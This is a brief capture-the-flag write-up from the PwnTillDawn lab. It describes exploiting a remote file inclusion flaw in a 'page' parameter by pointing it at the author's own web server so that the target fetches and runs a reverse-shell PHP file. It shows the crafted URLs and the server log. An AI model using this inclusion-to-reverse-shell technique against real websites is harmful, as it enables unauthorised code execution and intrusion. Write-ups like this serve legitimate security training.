Pwntilldawn
target:  10.150.150.18 
I found a website on it http://10.150.150.18/index.php?page=home
I replace the home url by http://10.150.150.18/index.php?page=http://google.com
and now i found blank page 
Now i deep dive on it: i replace it by my own server to see how it's react 
http://10.150.150.18/index.php?page=http://10.66.67.206/note2.txt
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/Pwntilldawn]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.150.150.18 - - [07/Sep/2023 20:24:44] code 404, message File not found
10.150.150.18 - - [07/Sep/2023 20:24:44] "GET /note2.txt.php HTTP/1.0" 404 -

Here i got an answer if he got a file he transform it in .php file
Now i will try to upload a reverse shell then it will be reverse-shell.php and if he executed i will got a shell
I have my file reverse-shell.php
but in the server i will only do http://10.150.150.18/index.php?page=http://10.66.67.206/reverse_shell and  he will got reverse_shell.php and i will got my shell successfuly